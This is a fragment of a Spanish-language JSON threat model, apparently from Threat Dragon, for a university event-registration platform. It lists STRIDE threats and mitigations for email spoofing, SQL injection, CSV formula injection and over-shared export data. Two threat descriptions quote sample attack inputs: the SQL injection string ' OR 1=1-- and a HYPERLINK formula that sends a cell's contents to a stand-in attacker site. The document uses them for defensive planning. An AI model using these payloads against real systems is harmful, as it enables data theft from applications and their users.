+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "7729a57c-eea7-5b10-81e6-65154129bbe3",
+                  "title": "T20 Correos falsos a nombre de EventosU",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Spoofing",
+                  "description": "Un atacante que envía correos con remitente falsificado a nombre de EventosU anunciando “tu entrada QR está lista” puede dirigir a los estudiantes a un sitio clonado, y obtiene sus credenciales o cobros por entradas inexistentes.",
+                  "mitigation": "Respuesta: Mitigar. El dominio de envío publica SPF, firma con DKIM a través del proveedor de correo y aplica DMARC con política p=reject, y las plantillas de correo no incluyen formularios de login ni solicitan pagos.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 20,
+                  "score": "4 (I2 x P2, Medio)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "eee1f5f4-1e67-58d7-ac53-dba33cb4a002",
+            "source": {
+              "cell": "897220cd-d140-5215-94e7-60a8fffe6a79"
+            },
+            "target": {
+              "cell": "b51f5276-4699-5bb4-a13a-b1317b524e60"
+            },
+            "vertices": [
+              {
+                "x": 1690,
+                "y": 215
+              },
+              {
+                "x": 1000,
+                "y": 215
+              },
+              {
+                "x": 250,
+                "y": 215
+              },
+              {
+                "x": 230,
+                "y": 480
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": "block"
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Usuarios, eventos,\ninscripciones y pagos\n(TLS, PostgreSQL)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Usuarios, eventos,\ninscripciones y pagos\n(TLS, PostgreSQL)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "TLS",
+              "isEncrypted": true,
+              "isPublicNetwork": false,
+              "isBidirectional": true,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "c5cdeab0-6c37-5553-b4d8-8ab4732af23d",
+                  "title": "T25 Inyección SQL en el buscador del catálogo",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "Un visitante que escribe ' OR 1=1-- en el buscador del catálogo puede alterar la consulta si la API concatena texto en SQL, y obtiene el contenido de la tabla de usuarios con hashes de contraseña y los datos de las inscripciones.",
+                  "mitigation": "Respuesta: Mitigar. Todas las consultas usan sentencias parametrizadas del ORM, el usuario de base de datos de la API no tiene permisos DDL ni acceso a tablas de auditoría, y Semgrep bloquea en el pipeline cualquier consulta construida por concatenación.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 25,
+                  "score": "6 (I3 x P2, Alto)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "2cc4220b-2674-55a6-92ad-742f841b3cb4",
+            "source": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "target": {
+              "cell": "837e20c5-f8c6-512c-9a1d-ede8981ed704"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Afiches y CSV\n(HTTPS, API de objetos)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Afiches y CSV\n(HTTPS, API de objetos)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": false,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "1361476c-2bef-5e54-937d-ce5517e1980d",
+            "source": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "target": {
+              "cell": "7caf8551-4564-5e5a-93c4-930cef2e7689"
+            },
+            "vertices": []
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "red",
+                "strokeWidth": 2.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Descarga de CSV de inscritos\n(HTTPS, URL firmada)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Descarga de CSV de inscritos\n(HTTPS, URL firmada)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [
+                {
+                  "id": "cf98b556-502d-5dd5-9658-89ef98c9dd4b",
+                  "title": "T11 Inyección de fórmulas en el CSV exportado",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Tampering",
+                  "description": "Un estudiante que se registra con el nombre =HYPERLINK(\"https://sitio-atacante/?d=\"&C2,\"Ver\") puede lograr que, cuando el organizador abre el CSV en Excel, la celda se interprete como fórmula, y obtiene los datos de las columnas vecinas o induce al organizador a abrir un enlace malicioso.",
+                  "mitigation": "Respuesta: Mitigar. Al generar el CSV la API antepone una comilla simple a todo valor que empiece con =, +, -, @, tabulación o retorno de carro, y el registro de usuarios valida el nombre con una lista de caracteres permitidos.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 11,
+                  "score": "4 (I2 x P2, Medio)"
+                },
+                {
+                  "id": "f105bb78-7afd-54a1-a205-cfb22e4ccaec",
+                  "title": "T13 CSV con datos que el organizador no necesita",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "Un organizador que solo necesita contar asistentes y enviar avisos recibe además carné y teléfono de cada inscrito, y cualquier persona que obtiene el archivo por pérdida de una laptop o por un reenvío accede a datos que no eran necesarios para la logística del evento.",
+                  "mitigation": "Respuesta: Eliminar. Se eliminan las columnas carné y teléfono de la exportación, el CSV contiene solo nombre, correo y estado de pago, y si un evento requiere el carné el administrador lo habilita de forma explícita y el cambio queda registrado.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 13,
+                  "score": "4 (I2 x P2, Medio)"
+                }
+              ],
+              "hasOpenThreats": true
+            },
+            "id": "cb6184f2-02f4-5a0c-9e57-ce775a17ac50",
+            "source": {
+              "cell": "7caf8551-4564-5e5a-93c4-930cef2e7689"
+            },
+            "target": {
+              "cell": "1ea75a5f-45a5-563a-82e2-ffb32cf4bd52"
+            },
+            "vertices": [
+              {
+                "x": 1250,
+                "y": 950
+              },
+              {
+                "x": 800,
+                "y": 960
+              },
+              {
+                "x": 330,
+                "y": 820
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Afiches de eventos\n(HTTPS, vía CDN)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Afiches de eventos\n(HTTPS, vía CDN)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": true,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "03bd411c-954a-54eb-ada5-50fd057d0b6d",
+            "source": {
+              "cell": "7caf8551-4564-5e5a-93c4-930cef2e7689"
+            },
+            "target": {
+              "cell": "1a50b90e-12b7-541a-8f9b-f71b1609c29f"
+            },
+            "vertices": [
+              {
+                "x": 1240,
+                "y": 560
+              },
+              {
+                "x": 900,
+                "y": 520
+              }
+            ]
+          },
+          {
+            "shape": "flow",
+            "attrs": {
+              "line": {
+                "stroke": "#333333",
+                "strokeWidth": 1.5,
+                "targetMarker": {
+                  "name": "block"
+                },
+                "sourceMarker": {
+                  "name": ""
+                },
+                "strokeDasharray": null
+              }
+            },
+            "width": 200,
+            "height": 100,
+            "zIndex": 10,
+            "labels": [
+              {
+                "markup": [
+                  {
+                    "tagName": "ellipse",
+                    "selector": "labelBody"
+                  },
+                  {
+                    "tagName": "text",
+                    "selector": "labelText"
+                  }
+                ],
+                "attrs": {
+                  "labelText": {
+                    "text": "Eventos de auditoría\ny errores (HTTPS, JSON)",
+                    "textAnchor": "middle",
+                    "textVerticalAnchor": "middle"
+                  },
+                  "labelBody": {
+                    "ref": "labelText",
+                    "refRx": "50%",
+                    "refRy": "60%",
+                    "fill": "#fff",
+                    "strokeWidth": 0
+                  }
+                },
+                "position": 0.5
+              }
+            ],
+            "connector": "smooth",
+            "data": {
+              "type": "tm.Flow",
+              "name": "Eventos de auditoría\ny errores (HTTPS, JSON)",
+              "description": "",
+              "outOfScope": false,
+              "reasonOutOfScope": "",
+              "protocol": "HTTPS",
+              "isEncrypted": true,
+              "isPublicNetwork": false,
+              "isBidirectional": false,
+              "isTrustBoundary": false,
+              "threats": [],
+              "hasOpenThreats": false
+            },
+            "id": "2be6b2eb-9c43-52dd-8e30-e113fdac1780",
+            "source": {
+              "cell": "e4bb6e73-ffd1-5908-8321-0ecbde3fb865"
+            },
+            "target": {
+              "cell": "512803c3-bcea-5df8-9aac-16e5e715ea32"
+            },
+            "vertices": [
+              {
+                "x": 1150,
+                "y": 1000
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "diagramTop": 2,
+    "reviewer": "",
+    "threatTop": 28
+  }
+}
